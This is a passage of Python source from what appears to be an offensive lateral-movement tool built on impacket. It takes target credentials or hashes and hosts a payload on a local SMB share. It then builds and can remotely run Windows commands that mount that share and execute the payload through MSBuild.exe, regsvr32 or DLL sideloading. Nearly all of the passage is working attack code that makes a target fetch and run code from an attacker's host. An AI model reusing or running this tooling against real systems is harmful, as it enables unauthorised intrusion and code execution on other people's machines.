            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)


    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
                repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        if options.drive is not None and options.drive.isalpha() and len(options.drive) < 2:  # did we get a drive letter?
            drive_letter = str(options.drive).upper()
        else:
            drive_letter = 'Q'

        if options.hashes is not None and options.hashes.find(':') == -1:  # quick check to prevent formatting error with hashes
            options.hashes = ':{}'.format(options.hashes)

        if options.ip is not None:  # did they give us the local ip in the command line
            local_ip = options.ip
            ifaces = ni.interfaces()
            try:  # check to see if the interface has an ip
                if local_ip in ifaces:
                    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                    printnlog("local IP => " + local_ip)
            except BaseException as exc:
                printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                exit(0)
        else:
            # print local interfaces and ips
            print("")
            ifaces = ni.interfaces()
            for face in ifaces:
                try:  # check to see if the interface has an ip
                    printnlog('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))
                except BaseException as exc:
                    continue

            local_ip = input("\nEnter you local ip or interface: ")

            # lets you enter eth0 as the ip
            if local_ip in ifaces:
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                printnlog("local IP => " + local_ip)

        port445_check(local_ip)  # check if port 445 is in use


        share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
        printnlog("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))

        # automatically find the best drive to use

        if options.oe:  # I cannot for the life of me remember why this is in here
            addresses = ['23423.5463.1234.3465']

        if options.payload == 'msbuild':
            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
        elif options.payload == 'regsvr32':
            addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
        elif options.payload == 'exe':
            gen_payload_exe(share_name, payload_name, addresses)
        elif options.payload == 'dllsideload':
            gen_payload_dllsideload(share_name, addresses)


        if options.payload == 'msbuild':
            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        elif options.payload == 'regsvr32':
            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
        elif options.payload == 'exe':
            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        elif options.payload == 'dllsideload':
            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)

        printnlog(command)
        printnlog("")

        if options.oe:
            alt_exec(command, domain, username, address)

    except Exception as e:
        print(ste(e))
